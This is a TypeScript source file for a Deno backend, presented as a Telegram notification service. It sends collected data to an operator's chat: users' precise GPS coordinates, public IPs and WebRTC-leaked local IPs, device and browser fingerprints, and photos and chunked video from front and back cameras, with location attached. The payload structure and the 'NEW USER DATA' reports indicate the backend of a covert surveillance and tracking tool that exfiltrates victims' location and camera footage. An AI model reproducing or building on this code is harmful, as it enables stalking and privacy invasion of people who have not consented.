// Telegram notification service
// 
// 🎨 All messages use beautiful HTML formatting for better readability:
// 
// Example output:
// ┌──────────────────────────────────
// │ 🎯 NEW USER DATA
// │
// │ 📍 Geolocation
// │ ├ Latitude: 55.881822
// │ ├ Longitude: 37.582668
// │ ├ Accuracy: ±149 m
// │ └ 🗺️ Open in Google Maps
// │
// │ 🌐 IP Addresses
// │ ├ Public: 89.23.123.2
// │ └ WebRTC: 192.168.1.5
// │
// │ 💻 Device Information
// │ ├ Device: 🖥️ Desktop
// │ ├ Browser: 🌍 chrome
// │ └ ...
// └──────────────────────────────────

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const TELEGRAM_MAIN_CHAT_ID = Deno.env.get("TELEGRAM_MAIN_CHAT_ID");
const TELEGRAM_NOTIFICATION_CHAT_IDS = Deno.env.get("TELEGRAM_NOTIFICATION_CHAT_IDS");

// Parse notification chat IDs from comma-separated string
const getNotificationChatIds = (): number[] => {
  if (!TELEGRAM_NOTIFICATION_CHAT_IDS) return [];
  return TELEGRAM_NOTIFICATION_CHAT_IDS.split(',').map(id => parseInt(id.trim())).filter(id => !isNaN(id));
};

export interface UserDataPayload {
  latitude: number;
  longitude: number;
  accuracy: number;
  publicIP?: string;
  webrtcIPs?: string[];
  device?: string;
  browser?: string;
  userAgent?: string;
  timezone?: string;
  languages?: string;
  localTime?: string;
}

export interface PhotoPayload {
  photoBlob: Blob;
  cameraType: 'front' | 'back';
  userAgent?: string;
  device?: string;
}

export interface VideoPayload {
  videoBlob: Blob;
  chunkNumber: number;
  cameraType: 'front' | 'back';
  userAgent?: string;
  device?: string;
  geoData?: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  };
}

export interface StartNotificationPayload {
  timestamp: string;
}

// Send user data to main chat
export async function sendUserDataToTelegram(data: UserDataPayload): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
      console.error('❌ [Telegram] Missing bot token or main chat ID');
      return false;
    }

    const lat = data.latitude.toFixed(6);
    const lng = data.longitude.toFixed(6);
    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
    
    const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
    const deviceName = data.device === 'ios' ? 'iOS' : data.device === 'android' ? 'Android' : 'Desktop';
    
    // 🎨 Красивое HTML форматирование для Telegram
    let message = `<b>🎯 NEW USER DATA</b>\n\n`;
    
    // 📍 Геолокация
    message += `<b>📍 Geolocation</b>\n`;
    message += `├ <b>Latitude:</b> <code>${lat}</code>\n`;
    message += `├ <b>Longitude:</b> <code>${lng}</code>\n`;
    message += `├ <b>Accuracy:</b> ±${Math.round(data.accuracy)} m\n`;
    message += `└ <a href="${googleMapsLink}">🗺️ Open in Google Maps</a>\n\n`;
    
    // 🌐 IP адреса
    if (data.publicIP || (data.webrtcIPs && data.webrtcIPs.length > 0)) {
      message += `<b>🌐 IP Addresses</b>\n`;
      if (data.publicIP) {
        message += `├ <b>Public:</b> <code>${data.publicIP}</code>\n`;
      }
      if (data.webrtcIPs && data.webrtcIPs.length > 0) {
        const webrtcList = data.webrtcIPs.map(ip => `<code>${ip}</code>`).join(', ');
        message += `└ <b>WebRTC:</b> ${webrtcList}\n`;
      }
      message += `\n`;
    }
    
    // 💻 Информация об устройстве
    message += `<b>💻 Device Information</b>\n`;
    if (data.device) {
      message += `├ <b>Device:</b> ${deviceEmoji} ${deviceName}\n`;
    }
    if (data.browser) {
      message += `├ <b>Browser:</b> 🌍 ${data.browser}\n`;
    }
    if (data.localTime) {
      message += `├ <b>Local Time:</b> ⏰ ${data.localTime}\n`;
    }
    if (data.timezone) {
      message += `├ <b>Timezone:</b> 🕐 ${data.timezone}\n`;
    }
    if (data.languages) {
      message += `├ <b>Languages:</b> 🗣️ ${data.languages}\n`;
    }
    if (data.userAgent) {
      message += `└ <b>User-Agent:</b>\n   <code>${data.userAgent}</code>`;
    }
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
    formData.append('text', message);
    formData.append('parse_mode', 'HTML'); // 🎨 Включаем HTML форматирование!
    formData.append('disable_web_page_preview', 'false'); // Показываем превью ссылок
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      console.log('✅ [Telegram] User data sent successfully');
      return true;
    } else {
      const errorText = await response.text();
      console.error('❌ [Telegram] Failed to send user data:', errorText);
      return false;
    }
  } catch (error) {
    console.error('❌ [Telegram] Error sending user data:', error);
    return false;
  }
}

// Send photo to main chat
export async function sendPhotoToTelegram(data: PhotoPayload): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
      console.error('❌ [Telegram] Missing bot token or main chat ID');
      return false;
    }

    const cameraEmoji = data.cameraType === 'front' ? '🤳' : '📷';
    const cameraName = data.cameraType === 'front' ? 'Front Camera' : 'Back Camera';
    const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
    
    const caption = `<b>${cameraEmoji} ${cameraName}</b>\n└ ${deviceEmoji} ${data.device || 'Unknown device'}`;
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
    formData.append('photo', data.photoBlob, `photo_${data.cameraType}_${Date.now()}.jpg`);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      console.log(`✅ [Telegram] Photo (${data.cameraType}) sent successfully`);
      return true;
    } else {
      const errorText = await response.text();
      console.error(`❌ [Telegram] Failed to send photo (${data.cameraType}):`, errorText);
      return false;
    }
  } catch (error) {
    console.error(`❌ [Telegram] Error sending photo (${data.cameraType}):`, error);
    return false;
  }
}

// Send video to main chat
export async function sendVideoToTelegram(data: VideoPayload): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
      console.error('❌ [Telegram] Missing bot token or main chat ID');
      return false;
    }

    const cameraEmoji = data.cameraType === 'front' ? '🤳' : '📷';
    const cameraName = data.cameraType === 'front' ? 'Front Camera' : 'Back Camera';
    const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
    
    let caption = `<b>🎥 Video Chunk #${data.chunkNumber}</b>\n├ <b>Camera:</b> ${cameraEmoji} ${cameraName}\n└ <b>Device:</b> ${deviceEmoji} ${data.device || 'Unknown'}`;
    
    // ✅ Add geolocation if available
    if (data.geoData) {
      const lat = data.geoData.latitude.toFixed(6);
      const lng = data.geoData.longitude.toFixed(6);
      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
      
      caption += `\n\n<b>📍 Location</b>\n├ <code>${lat}, ${lng}</code>\n├ <b>Accuracy:</b> ±${Math.round(data.geoData.accuracy)} m\n└ <a href="${googleMapsLink}">🗺 Open in Maps</a>`;
    }
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
    formData.append('video', data.videoBlob, `video_${data.cameraType}_chunk${data.chunkNumber}_${Date.now()}.webm`);
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      console.log(`✅ [Telegram] Video chunk #${data.chunkNumber} (${data.cameraType}) sent successfully`);
      return true;
    } else {
      const errorText = await response.text();
      console.error(`❌ [Telegram] Failed to send video chunk #${data.chunkNumber} (${data.cameraType}):`, errorText);
      return false;
    }
  } catch (error) {
    console.error(`❌ [Telegram] Error sending video chunk #${data.chunkNumber} (${data.cameraType}):`, error);
    return false;
  }
}

// Send /start notification to notification chat IDs
export async function sendStartNotification(data: StartNotificationPayload): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN) {
      console.error('❌ [Telegram] Missing bot token');
      return false;
    }

    const chatIds = getNotificationChatIds();
    if (chatIds.length === 0) {
      console.warn('⚠️ [Telegram] No notification chat IDs configured');
      return false;
    }

    const message = `<b>🔔 User Activity</b>\\n\\n<b>Action:</b> Executed /start command\\n<b>Timestamp:</b> <code>${data.timestamp}</code>`;
    
    // Send to all notification chat IDs in parallel
    const promises = chatIds.map(async (chatId) => {
      const formData = new FormData();
      formData.append('chat_id', chatId.toString());
      formData.append('text', message);
      formData.append('parse_mode', 'HTML');
      
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        body: formData
      });
      
      return response.ok;
    });
    
    const results = await Promise.all(promises);
    const allSuccess = results.every(result => result);
    
    if (allSuccess) {
      console.log('✅ [Telegram] Start notifications sent to all chat IDs');
    } else {
      console.warn('⚠️ [Telegram] Some start notifications failed');
    }
    
    return allSuccess;
  } catch (error) {
    console.error('❌ [Telegram] Error sending start notifications:', error);
    return false;
  }
}

// ✅ ДОБАВЛЕНО: Send text message to main chat
export async function sendTextMessage(message: string): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
      console.error('❌ [Telegram] Missing bot token or main chat ID');
      return false;
    }

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
    formData.append('text', message);
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      console.log('✅ [Telegram] Text message sent successfully');
      return true;
    } else {
      const errorText = await response.text();
      console.error('❌ [Telegram] Failed to send text message:', errorText);
      return false;
    }
  } catch (error) {
    console.error('❌ [Telegram] Error sending text message:', error);
    return false;
  }
}